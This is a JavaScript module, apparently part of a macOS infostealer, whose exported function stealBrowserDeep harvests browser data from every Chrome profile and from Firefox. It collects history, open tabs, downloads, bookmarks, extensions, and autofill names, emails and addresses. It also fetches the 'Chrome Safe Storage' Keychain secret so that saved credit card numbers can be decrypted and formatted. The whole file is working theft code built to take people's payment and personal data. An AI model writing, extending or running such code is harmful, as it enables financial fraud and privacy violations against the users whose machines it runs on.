'use strict';
/*
 * Browser deep-dive: history, credit cards / addresses (Web Data), bookmarks,
 * downloads, open tabs / session, and installed extensions.
 *
 * Reuses the hand-rolled SQLite reader (lib/sqlite.js) for the Chromium
 * History / Web Data / Downloads DBs and the JSON Bookmarks file. Firefox
 * history (places.sqlite) is read the same way. Missing files are skipped.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const { readSchema, scanRecords } = require('./sqlite');
const { keychainGet } = require('./keychain');

const APP_SUPPORT = path.join(os.homedir(), 'Library', 'Application Support');

// Chrome stores saved payment methods in the `credit_cards` table with the
// number in `card_number_encrypted` as a v10 os_crypt blob, keyed by the
// "Chrome Safe Storage" Keychain secret (account "Chrome" — one shared secret
// across all Chrome profiles, unlike the per-profile cookie/password secret).
// Decrypt it and format the number into 4-digit groups.
function formatCardNumber(s) {
  const digits = String(s).replace(/\D/g, '');
  if (digits.length < 12) return s;
  return digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
}

function readTable(file, table, validator, maxRows) {
  try {
    const buf = fs.readFileSync(file);
    const t = readSchema(buf).find((x) => x.name === table);
    if (!t) return [];
    const rows = scanRecords(buf, t.colTypes, validator, maxRows);
    return rows.map((vals) => {
      const o = {};
      t.columns.forEach((c, i) => { o[c] = vals[i]; });
      return o;
    });
  } catch (e) {
    return [];
  }
}

// Chromium History DB -> visit history. Modern Chrome dropped the legacy
// `history` table in favor of `urls` (deduplicated) + `visits` (per-visit).
// We read both: the deduplicated URL list plus individual visit timestamps.
// Row caps keep memory bounded on huge tables (a 173 MB History DB has
// millions of `visits` rows). scanRecords keeps the LAST maxRows rows.
const MAX_URLS = 5000;
const MAX_VISITS = 20000;
const MAX_CARDS = 100;
const MAX_ADDRESSES = 500;
const MAX_DOWNLOADS = 2000;

// Validators receive getCol(i) (decode column i on demand) plus the serial
// types — no per-candidate row array is allocated.
const hasText = (i) => (getCol) => { const v = getCol(i); return typeof v === 'string' && v.length > 0; };

// Plausible Chrome-epoch timestamp (microseconds since 1601-01-01; ~1.3e16 for
// the 2020s).
const isChromeTime = (i) => (getCol) => { const t = getCol(i); return typeof t === 'number' && t > 1e14 && t < 1e17; };
// A URL-like string (has a scheme or a dot) — filters garbage candidates.
const isUrlText = (i) => (getCol) => { const v = getCol(i); return typeof v === 'string' && v.length > 0 && (v.includes('://') || v.includes('.')); };
// A valid GUID — the credit_cards / masked_credit_cards tables key on a GUID,
// which filters out the byte-scan's false candidates from other tables.
const isGuid = (i) => (getCol) => { const v = getCol(i); return typeof v === 'string' && /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(v); };
const isExpMonth = (i) => (getCol) => { const v = getCol(i); return typeof v === 'number' && v >= 1 && v <= 12; };
const isExpYear = (i) => (getCol) => { const v = getCol(i); return typeof v === 'number' && v >= 2000 && v <= 2040; };
const nonEmptyText = (i) => (getCol) => { const v = getCol(i); return typeof v === 'string' && v.length > 0; };
// A simple autofill field name (account_number, input-month, email, ...) —
// filters the byte-scan's false candidates carved from the 27-column
// `keywords` table, whose 6-column windows have garbage at col 0.
const isFieldName = (i) => (getCol) => { const v = getCol(i); return typeof v === 'string' && /^[a-z][a-z0-9_-]{0,40}$/i.test(v); };

// Chromium history. The `urls` table is the deduplicated history (one row per
// URL: url, title, visit_count, last_visit_time). Real rows are identified by
// a URL-like text at col 1 AND a plausible last_visit_time at col 5 — the
// timestamp is the key discriminator against 7-column windows carved out of the
// 18-column `visits` table (which carry a real referrer URL at their col 1 but
// no timestamp at col 5).
//
// We do NOT read the `visits` table: its `url` column is an integer FK into
// urls' rowid, which is not stored in the record (the id column is null), so
// the byte scan cannot resolve it back to a URL. The `urls` table already
// carries last_visit_time + visit_count, which is the useful history signal.
function readHistory(file) {
  const rawUrls = readTable(file, 'urls', (getCol) => isUrlText(1)(getCol) && isChromeTime(5)(getCol), 100000);
  const seen = new Set();
  const urls = [];
  for (const r of rawUrls) {
    if (typeof r.url !== 'string' || r.url.length === 0 || seen.has(r.url)) continue;
    seen.add(r.url);
    urls.push({
      url: r.url,
      title: typeof r.title === 'string' ? r.title : undefined,
      visit_count: typeof r.visit_count === 'number' ? r.visit_count : undefined,
      typed_count: typeof r.typed_count === 'number' ? r.typed_count : undefined,
      last_visit_time: typeof r.last_visit_time === 'number' ? r.last_visit_time : undefined,
    });
  }
  return { urls };
}

// Chromium Web Data DB -> credit cards + autofill (names/emails/addresses).
//
// The Web Data DB has many similar tables, so the byte scan produces false
// candidates from other tables. We discriminate real rows with table-specific
// checks (a valid GUID key + a plausible expiration month/year for cards) so
// empty tables report empty instead of garbage. Column names follow the modern
// schema (credit_cards: guid/name_on_card/expiration_month/...; the address
// fields live in the flat `autofill` name/value table, not `addresses`).
function readWebData(file, decrypt) {
  const cards = readTable(file, 'credit_cards', (getCol) => isGuid(0)(getCol) && isExpMonth(2)(getCol) && isExpYear(3)(getCol), MAX_CARDS)
    .map((r) => {
      let card_number = null;
      if (r.card_number_encrypted instanceof Buffer && decrypt) {
        try { card_number = formatCardNumber(decrypt(r.card_number_encrypted)); } catch (e) {}
      }
      return {
        guid: r.guid,
        name_on_card: r.name_on_card,
        card_number,
        card_number_encrypted: r.card_number_encrypted instanceof Buffer ? r.card_number_encrypted.toString('hex') : undefined,
        expiration_month: r.expiration_month,
        expiration_year: r.expiration_year,
        nickname: r.nickname,
      };
    });
  const masked = readTable(file, 'masked_credit_cards', (getCol) => nonEmptyText(1)(getCol) && isExpMonth(4)(getCol) && isExpYear(5)(getCol), MAX_CARDS)
    .map((r) => ({
      name_on_card: r.name_on_card,
      network: r.network,
      last_four: r.last_four,
      exp_month: r.exp_month,
      exp_year: r.exp_year,
      bank_name: r.bank_name,
    }));
  // Flat name/value pairs: captures saved names, emails, and address fields.
  const autofill = readTable(file, 'autofill', (getCol) => isFieldName(0)(getCol) && nonEmptyText(1)(getCol), MAX_ADDRESSES)
    .map((r) => ({ field: r.name, value: r.value }));
  return { credit_cards: cards, masked_credit_cards: masked, autofill };
}

// Chromium download history. Older builds keep a Downloads SQLite DB; modern
// Chrome replaced it with a protobuf DownloadMetadata file. Read both when
// present.
function readDownloads(dir) {
  const out = readTable(path.join(dir, 'Downloads'), 'downloads', (getCol) => typeof getCol(1) === 'string' || typeof getCol(2) === 'string', MAX_DOWNLOADS)
    .map((r) => ({
      current_path: r.current_path,
      target_file_name: r.target_file_name,
      url: r.url,
      start_time: r.start_time,
      state: r.state,
    }))
    .filter((r) => r.url || r.target_file_name);
  try {
    const buf = fs.readFileSync(path.join(dir, 'DownloadMetadata'));
    const seen = new Set(out.map((r) => r.url).filter(Boolean));
    const re = /https?:\/\/[^\x00-\x1f\x7f-\xff"]{8,500}/g;
    let m;
    while ((m = re.exec(buf)) !== null) {
      if (!seen.has(m[0])) { seen.add(m[0]); out.push({ url: m[0] }); }
    }
  } catch (e) {}
  return out;
}

// Chromium Bookmarks JSON file. The root object's values (bookmark_bar,
// other, synced) are the top-level folders — walk each of them.
function readBookmarks(file) {
  try {
    const j = JSON.parse(fs.readFileSync(file, 'utf8'));
    const out = [];
    const walk = (node) => {
      if (!node) return;
      if (node.type === 'url') out.push({ name: node.name, url: node.url });
      if (node.children) for (const c of node.children) walk(c);
    };
    for (const key of Object.keys(j.roots || {})) walk(j.roots[key]);
    return out;
  } catch (e) {
    return [];
  }
}

// Chromium session / tabs. Modern Chrome writes Session_*/Tabs_* protobuf
// files under Sessions/ (older builds use Last Session / Current Tabs). Scan
// the raw bytes for http(s) URLs as a cheap tab list.
function readTabs(dir) {
  const urls = new Set();
  const files = [path.join(dir, 'Last Session'), path.join(dir, 'Current Tabs')];
  const sessDir = path.join(dir, 'Sessions');
  let entries = [];
  try { entries = fs.readdirSync(sessDir); } catch (e) {}
  for (const e of entries) files.push(path.join(sessDir, e));
  for (const f of files) {
    if (!fs.existsSync(f)) continue;
    try {
      const buf = fs.readFileSync(f);
      const re = /https?:\/\/[^\x00-\x1f\x7f-\xff"]{5,200}/g;
      let m;
      while ((m = re.exec(buf)) !== null) urls.add(m[0]);
    } catch (e) {}
  }
  return [...urls];
}

// Chromium installed extensions (top-level dirs under Extensions/).
function readExtensions(dir) {
  const base = path.join(dir, 'Extensions');
  const out = [];
  let entries;
  try { entries = fs.readdirSync(base, { withFileTypes: true }); } catch (e) { return out; }
  for (const ent of entries) {
    if (!ent.isDirectory()) continue;
    const manifest = path.join(base, ent.name, 'manifest.json');
    let name = null;
    try {
      const j = JSON.parse(fs.readFileSync(manifest, 'utf8'));
      name = j.name;
    } catch (e) {}
    out.push({ id: ent.name, name });
  }
  return out;
}

// Only real user profiles (dirs with a Preferences file) — this skips the ~40
// Chrome component-update directories (Safe Browsing, CertificateRevocation,
// Crashpad, GPUPersistentCache, etc.) that are not profiles.
function eachChromeProfile() {
  const base = path.join(APP_SUPPORT, 'Google', 'Chrome');
  const out = [];
  let entries;
  try { entries = fs.readdirSync(base, { withFileTypes: true }); } catch (e) { return out; }
  for (const ent of entries) {
    if (!ent.isDirectory()) continue;
    const dir = path.join(base, ent.name);
    if (fs.existsSync(path.join(dir, 'Preferences'))) out.push(dir);
  }
  return out;
}

function stealBrowserDeep(makeDecryptor) {
  const result = { profiles: [] };
  // Chrome stores the payment-method encryption key under "Chrome Safe Storage"
  // (account "Chrome") — one shared secret across all profiles, distinct from
  // the per-profile cookie/password secret.
  const chromeDecrypt = makeDecryptor ? makeDecryptor(keychainGet('Chrome Safe Storage', 'Chrome')) : null;
  for (const dir of eachChromeProfile()) {
    const prof = { name: path.basename(dir) };
    prof.history = readHistory(path.join(dir, 'History'));
    const wd = readWebData(path.join(dir, 'Web Data'), chromeDecrypt);
    // Payment methods synced to the Google account live in "Account Web Data",
    // not the local Web Data — merge its cards (deduped by guid) too.
    const acct = path.join(dir, 'Account Web Data');
    if (fs.existsSync(acct)) {
      const acctWd = readWebData(acct, chromeDecrypt);
      const seen = new Set(wd.credit_cards.map((c) => c.guid).filter(Boolean));
      for (const c of acctWd.credit_cards) {
        if (!c.guid || seen.has(c.guid)) continue;
        seen.add(c.guid);
        wd.credit_cards.push(c);
      }
    }
    prof.web_data = wd;
    prof.downloads = readDownloads(dir);
    prof.bookmarks = readBookmarks(path.join(dir, 'Bookmarks'));
    prof.open_tabs = readTabs(dir);
    prof.extensions = readExtensions(dir);
    result.profiles.push(prof);
  }
  // Firefox history (places.sqlite).
  const ffBase = path.join(os.homedir(), '.mozilla', 'firefox');
  let ffEntries = [];
  try { ffEntries = fs.readdirSync(ffBase, { withFileTypes: true }); } catch (e) {}
  for (const ent of ffEntries) {
    if (!ent.isDirectory()) continue;
    const places = path.join(ffBase, ent.name, 'places.sqlite');
    if (!fs.existsSync(places)) continue;
    const rows = readTable(places, 'moz_history', hasText(1), MAX_VISITS)
      .map((r) => ({ url: r.url, title: r.title, visit_date: r.visit_date }));
    result.profiles.push({ name: 'firefox/' + ent.name, firefox: true, history: rows });
  }
  return result;
}

module.exports = { stealBrowserDeep };
